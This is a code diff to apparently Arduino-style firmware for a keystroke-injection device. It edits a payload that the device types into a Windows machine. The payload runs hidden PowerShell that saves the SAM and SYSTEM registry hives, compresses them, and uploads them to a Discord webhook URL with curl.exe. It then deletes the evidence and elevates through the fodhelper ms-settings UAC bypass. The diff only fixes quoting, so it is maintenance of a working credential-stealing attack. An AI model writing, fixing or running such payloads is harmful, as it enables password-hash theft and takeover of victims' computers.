@@ -624,15 +624,17 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         Keyboard.releaseAll();
         delay(1000);
         Keyboard.print(
-            "echo $t=$env:TEMP+'\\SAM_Backup.zip';$w=$env:TEMP+'\\r';mkdir $w -Force;"
-            "reg save HKLM\\SAM $w'\\sam' /y;reg save HKLM\\SYSTEM $w'\\system' /y;"
-            "if(Test-Path ($w+'\\sam')){Compress-Archive -Path $w\\* -DestinationPath $t -Force;"
-            "$h=Get-Item $t;Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3' -Method Post -Form @{file=$h}}"
-            "Remove-Item $w -Recurse -Force;Remove-Item $t -Force > %TEMP%\\s.ps1 && "
+            "powershell -w h -nop -ep bypass -c \""
+            "Set-Content $env:TEMP\\s.ps1 '"
+            "$w=$env:TEMP+''\\r'';$t=$env:TEMP+''\\SAM.zip'';mkdir $w -Force;"
+            "reg save HKLM\\SAM ($w+''\\sam'') /y;reg save HKLM\\SYSTEM ($w+''\\system'') /y;"
+            "if(Test-Path ($w+''\\sam'')){Compress-Archive -Path $w\\* -DestinationPath $t -Force;"
+            "curl.exe -F \\\"file=@$t\\\" https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3}"
+            "Remove-Item $w -Recurse -Force;Remove-Item $t -Force'\" && "
             "powershell -w h -nop -ep bypass -c \""
             "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;"
             "New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force;"
-            "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value 'powershell -w h -nop -ep bypass -f %TEMP%\\s.ps1' -Force;"
+            "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value ('powershell -w h -nop -ep bypass -f '+(Join-Path $env:TEMP s.ps1)) -Force;"
             "Start-Process 'C:\\Windows\\System32\\fodhelper.exe';"
             "Start-Sleep -s 5;"
             "Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force\" & exit");
